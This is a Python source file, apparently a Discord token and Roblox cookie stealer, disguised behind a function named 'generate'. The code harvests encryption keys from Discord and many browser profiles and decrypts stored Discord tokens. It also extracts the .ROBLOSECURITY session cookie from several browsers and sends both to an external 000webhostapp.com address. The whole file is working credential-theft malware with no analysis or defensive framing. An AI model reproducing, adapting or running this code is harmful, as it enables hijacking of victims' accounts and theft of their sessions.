import os

def generate():
	try:
		from base64 import b64decode
		from Crypto.Cipher import AES
		from win32crypt import CryptUnprotectData
		from os import getlogin, listdir
		from json import loads
		from re import findall
		from urllib.request import Request, urlopen
		from subprocess import Popen, PIPE
		import requests
		from datetime import datetime
		import time
		import string
		import random
		import json
		from termcolor import colored
		import robloxpy
		import requests, re
		import browser_cookie3
	except Exception:
		os.system("py -m pip install -q datetime")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q Crypto")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q win32crypt")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q os")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q json")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q re")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q urllib")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q subprocess")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q requests")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q time")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q string")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q random")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q termcolor")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q robloxpy")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q browser_cookie3")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q discordwebhook")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q datetime")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q datetime")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q datetime")
		os.system('cls' if os.name == 'nt' else 'clear')
		os.system("py -m pip install -q datetime")
		os.system('cls' if os.name == 'nt' else 'clear')

	tokens = []
	cleaned = []
	checker = []

	def decrypt(buff, master_key):
		try:
			return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(
				buff[15:])[:-16].decode()
		except:
			return "Error"

	def gethwid():
		p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
		return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

	def get_token():
		already_check = []
		checker = []
		local = os.getenv('LOCALAPPDATA')
		roaming = os.getenv('APPDATA')
		chrome = local + "\\Google\\Chrome\\User Data"
		paths = {
			'Discord': roaming + '\\discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Lightcord': roaming + '\\Lightcord',
			'Discord PTB': roaming + '\\discordptb',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
			'Amigo': local + '\\Amigo\\User Data',
			'Torch': local + '\\Torch\\User Data',
			'Kometa': local + '\\Kometa\\User Data',
			'Orbitum': local + '\\Orbitum\\User Data',
			'CentBrowser': local + '\\CentBrowser\\User Data',
			'7Star': local + '\\7Star\\7Star\\User Data',
			'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
			'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
			'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
			'Chrome': chrome + 'Default',
			'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
			'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
			'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Iridium': local + '\\Iridium\\User Data\\Default'
		}
		for platform, path in paths.items():
			if not os.path.exists(path): continue
			try:
				with open(path + f"\\Local State", "r") as file:
					key = loads(file.read())['os_crypt']['encrypted_key']
					file.close()
			except:
				continue
			for file in listdir(path + f"\\Local Storage\\leveldb\\"):
				if not file.endswith(".ldb") and file.endswith(".log"):
					continue
				else:
					try:
						with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
							for x in files.readlines():
								x.strip()
								for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
									tokens.append(values)
					except PermissionError:
						continue
			for i in tokens:
				if i.endswith("\\"):
					i.replace("\\", "")
				elif i not in cleaned:
					cleaned.append(i)
			for token in cleaned:
				try:
					tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
				except IndexError == "Error":
					continue
				checker.append(tok)
				if tok == 'Error':
					Token = 'No logged in discord account'
					continue
				else:
					Token = tok
				headers = {'Authorization': Token, 'Content-Type': 'application/json'}
				try:
					res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
					return Token
				except:
					continue

	def getRBS():
		data = []
		try:
			cookies = browser_cookie3.firefox(domain_name='roblox.com')
			for cookie in cookies:
				if cookie.name == '.ROBLOSECURITY':
					data.append(cookies)
					data.append(cookie.value)
					return data
		except:
			pass
		try:
			cookies = browser_cookie3.edge(domain_name='roblox.com')
			for cookie in cookies:
				if cookie.name == '.ROBLOSECURITY':
					data.append(cookies)
					data.append(cookie.value)
					return data
		except:
			pass
		try:
			cookies = browser_cookie3.opera(domain_name='roblox.com')
			for cookie in cookies:
				if cookie.name == '.ROBLOSECURITY':
					data.append(cookies)
					data.append(cookie.value)
					return data
		except:
			pass
		try:
			cookies = browser_cookie3.chrome(domain_name='roblox.com')
			for cookie in cookies:
				if cookie.name == '.ROBLOSECURITY':
					data.append(cookies)
					data.append(cookie.value)
					return data
		except:
			pass

	RBS = getRBS()

	try:
		RBS = RBS[1]
	except:
		RBS = 'No logged in account'

	userdata = {"token": get_token(), "cookie": RBS}
	resp = requests.post('https://matched-anthem.000webhostapp.com/', params=userdata)